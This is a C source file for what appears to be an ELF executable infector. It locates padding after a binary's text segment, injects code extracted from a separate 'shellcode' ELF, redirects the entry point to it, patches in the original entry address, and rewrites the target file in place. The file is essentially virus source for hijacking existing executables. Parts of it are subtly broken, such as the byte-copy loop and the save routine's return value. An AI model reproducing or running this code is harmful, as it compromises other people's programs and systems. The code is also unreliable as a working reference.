#include "elffile.h"
#include <bits/stdint-uintn.h>
#include <elf.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define DEBUG

static int shellcode_patch_ret_address(struct Shellcode *this,  \
        Elf64_Addr addr)
{
    for(int i = 0; i < this->m_size; i++){
        if(*((uint8_t *)this->m_shellcode + i) == 0x55 &&       \
                *((uint8_t *)this->m_shellcode + (i+1)) == 0x99){
#ifdef DEBUG
            printf("signature found\n");
            printf("replacing address with entry point %lx\n",  \
                    addr);
#endif
            char buffer[16];
            sprintf(buffer, "%lx", addr);

            for(int j = 0; j < 16; j++, i++){
                *((uint8_t *)this->m_shellcode + i) = buffer[j];
            }
            return 0;
        }
    }

#ifdef DEBUG
    printf("signature not found in shellcode\n");
#endif

    return -1;
}

static int shellcode_extract_section(Shellcode *this, int index)
{
    this->m_size = (this->m_elf->m_shdr[index].sh_size + 8);
    this->m_shellcode = malloc(sizeof(uint8_t) * this->m_size);
    if(this->m_shellcode == NULL){
        fprintf(stderr, "memory allocation failed\n");
        goto err1;
    }

    memset(this->m_shellcode, 0, this->m_size);
    memcpy(this->m_shellcode, &this->m_elf->m_map[this->        \
            m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
            [index].sh_size);

    return 0;

err1:
    return -1;
}

static int target_save_file(Target *this)
{
    /* removing file */
    if(remove(this->m_elf->m_filename) < 0)
        goto err;

    int out = open(this->m_elf->m_filename, O_WRONLY | O_CREAT  \
            | O_TRUNC, 0x664);
    if(out < 0){
        goto err;
    }

    /* 
     * this part is critical so, make sure every byte is written
     * back to the new file
     */
    int size = this->m_elf->m_size;
    ssize_t written = 0;
    void *buffer = this->m_elf->m_map;

    while(size != 0 && (written = write(out, buffer, size))     \
        != 0){
        if(written == -1){
            if(errno == EINTR)
                continue;

#ifdef DEBUG
            fprintf(stderr, "error writing to file\n");
#endif
            goto err;
        }

        size -= written;
        buffer += written;
    }

    close(out);
err:
    return -1;
}

/* insert shellcode into Target binary */
static void target_insert_shellcode(Target *this, Shellcode     \
        *shellcode)
{
    for(int i = 0; i < shellcode->m_size; i++){
        this->m_elf->m_map[this->text_end + i] = (*((uint8_t *) \
            shellcode->m_shellcode) + i);
    }
}

/* to adjust section headers and other offsets */
static void target_adjust_sections(Target *this, int parasite_size)
{
    this->m_elf->m_ehdr->e_entry = this->parasite_addr;
    for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){
        if(this->m_elf->m_shdr[i].sh_addr > this->parasite_addr){
            /* 
             * increase offset of every section after infected one
             * by PAGE_SIZE
             */
            this->m_elf->m_shdr[i].sh_offset += PF_HP_PAGE_SIZE;
        } else {
            /* 
             * if sh_addr + sh_size == parasite_addr, we are at 
             * .text section. since we havent modified section
             * header's values such as sh_size, we should do that
             * now
             */
            if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->   \
                    m_shdr[i].sh_size == this->parasite_addr){
                this->m_elf->m_shdr[i].sh_size +=               \
                    parasite_size;
            }
        }
    }
}

/* find free space in target binary */
static int target_find_free_space(Target *this, int parasite_size)
{
    bool text_found = false;

#ifdef DEBUG
    printf("program headers %d\n", this->m_elf->m_ehdr->e_phnum);
#endif

    for(int i = 0; i < this->m_elf->m_ehdr->e_phnum; i++){

#ifdef DEBUG
        printf("header number %d\n", i);
#endif

        if(this->m_elf->m_phdr[i].p_type == PT_LOAD && this->   \
                m_elf->m_phdr[i].p_flags == (PF_R | PF_X)){

#ifdef DEBUG
            printf("%d text segment found\n", i);
#endif
            this->text_filesize = this->m_elf->m_phdr[i].p_filesz;
            Elf64_Off text_start = this->m_elf->m_phdr[i].p_offset;
            this->text_end = text_start + this->text_filesize;
            this->parasite_addr = this->m_elf->m_phdr[i].       \
                p_vaddr + this->text_filesize;

            /* resizing p_filesz and p_memsz */
            this->m_elf->m_phdr[i].p_filesz += parasite_size;
            this->m_elf->m_phdr[i].p_memsz += parasite_size;
            text_found = true;

        } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
            (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
            < parasite_size && text_found){
            this->available_freespace = this->m_elf->m_phdr[i]. \
                p_offset - this->text_end;

#ifdef DEBUG
            printf("segment found with a gap of %d\n", this->   \
                    available_freespace);
#endif
            text_found = false;

        }
    }

    return 0;
}

/* to get the .text section code from our shellcode */
static int elf_get_section_index_by_name(Elf *elf, const char   \
        *section_name)
{
    /* first we have to parse shstrtab */
    Elf64_Shdr *section = &elf->m_shdr[elf->m_ehdr->e_shstrndx];
    char *shstrtab = (char *)&elf->m_map[section->sh_offset];

    for(int i = 0; i < elf->m_ehdr->e_shnum; i++){
        if(strcmp(&shstrtab[elf->m_shdr[i].sh_name],            \
                    section_name) == 0){
            printf("%s section found\n", section_name);
            return i;
        }
    }

    return -1;
}

static void elf_parse_headers(Elf *elf)
{
    elf->m_ehdr = (Elf64_Ehdr *) elf->m_map;
    elf->m_phdr = (Elf64_Phdr *) &elf->m_map[elf->m_ehdr->      \
        e_phoff];
    elf->m_shdr = (Elf64_Shdr *) &elf->m_map[elf->m_ehdr->      \
        e_shoff];
}

static bool elf_is_elf(Elf *elf)
{
    if(elf->m_map == NULL){

#ifdef DEBUG
        fprintf(stderr, "file not mapped\n");
#endif
        goto err;
    }

    if(elf->m_map[0] != 0x7f || elf->m_map[1] != 'E' ||         \
            elf->m_map[2] != 'L' || elf->m_map[3] != 'F'){
#ifdef DEBUG
        fprintf(stderr, "not an elf binary\n");
#endif
        goto err;
    }

    return true;

err:
    return false;
}

static int elf_init_file(Elf *this)
{
    if(this->m_filename == NULL){

#ifdef DEBUG
        fprintf(stderr, "filename not specified\n");
#endif
        goto err;
    }

#ifdef DEBUG
    printf("%s\n", this->m_filename);
#endif

    int fd = open(this->m_filename, O_RDWR);
    if(fd < 0){
        puts(strerror(errno));
        fprintf(stderr, "file open error\n");
        goto err;
    }

    struct stat st;
    if(fstat(fd, &st) < 0){
#ifdef DEBUG
        fprintf(stderr, "fstat failed\n");
#endif
        goto err1;
    }

    this->m_size = st.st_size;
    this->m_map =mmap(NULL, this->m_size, PROT_READ |PROT_WRITE \
        , MAP_PRIVATE, fd, 0);
    if(this->m_map == MAP_FAILED){
#ifdef DEBUG
        fprintf(stderr, "memory map failed");
#endif
        goto err1;
    }

    close(fd);
    return 0;

err1:
    close(fd);

err:
    return -1;
}

Elf *ElfConstructor(const char *filename)
{
    Elf *elf = malloc(sizeof(Elf));
    if(elf == NULL){
#ifdef DEBUG
        fprintf(stderr, "memory allocation failed\n");
#endif
        goto err;
    }

    elf->m_filename = filename;
    elf->m_size = 0;
    elf->m_map = NULL;
    elf->m_ehdr = NULL;
    elf->m_phdr = NULL;
    elf->m_shdr = NULL;

    elf->InitFile = elf_init_file;
    elf->IsElf = elf_is_elf;
    elf->ParseHeaders = elf_parse_headers;
    elf->FindSectionIndexByName = elf_get_section_index_by_name;

err:
    return elf;
}

void ElfDestructor(Elf *this)
{
    if(this->m_map != NULL){
        if(munmap(this->m_map, this->m_size) < 0){
#ifdef DEBUG
            fprintf(stderr, "memory unmap failed\n");
#endif
        }
        this->m_map = NULL;
    }

    free(this);
}

Target *TargetConstructor(const char *filename)
{
    Target *target = malloc(sizeof(Target));
    if(target == NULL){
#ifdef DEBUG
        fprintf(stderr, "memory allocation error\n");
#endif
        goto err;
    }

    target->m_elf = ElfConstructor(filename);
    if(target->m_elf == NULL){
        goto err1;
    }

    if(target->m_elf->InitFile(target->m_elf) < 0){
        goto err2;
    }

    if(target->m_elf->IsElf(target->m_elf) == false){
        goto err2;
    }

    target->m_elf->ParseHeaders(target->m_elf);
    target->TargetFindFreeSpace = target_find_free_space;
    target->TargetAdjustSections = target_adjust_sections;
    target->TargetInsertShellcode = target_insert_shellcode;
    target->TargetSaveFile = target_save_file;

    return target;

err2:
    ElfDestructor(target->m_elf);

err1:
    free(target);

err:
    return NULL;
}

void TargetDestructor(Target *this)
{
    this->TargetSaveFile(this);
    ElfDestructor(this->m_elf);
    free(this);
}

Shellcode *ShellcodeConstructor(const char *filename)
{
    Shellcode *shellcode = malloc(sizeof(Shellcode));
    if(shellcode == NULL){
#ifdef DEBUG
        fprintf(stderr, "memory allocation error\n");
#endif
        goto err;
    }

    shellcode->m_elf = ElfConstructor(filename);
    if(shellcode->m_elf == NULL){
        goto err1;
    }

    if(shellcode->m_elf->InitFile(shellcode->m_elf) < 0){
        goto err2;
    }

    if(shellcode->m_elf->IsElf(shellcode->m_elf) == false){
        goto err2;
    }

    shellcode->m_elf->ParseHeaders(shellcode->m_elf);
    shellcode->PatchRetAddress = shellcode_patch_ret_address;
    shellcode->ShellcodeExtractText = shellcode_extract_section;

    return shellcode;

err2:
    ElfDestructor(shellcode->m_elf);

err1:
    free(shellcode);

err:
    return NULL;
}

void ShellcodeDestructor(Shellcode *this)
{
    /* remove shellcode files */
    if(remove(this->m_elf->m_filename) < 0){
#ifdef DEBUG
        fprintf(stderr, "failed to remove file\n");
#endif
        goto err;
    }

    ElfDestructor(this->m_elf);
    free(this);

err:
    return;
}
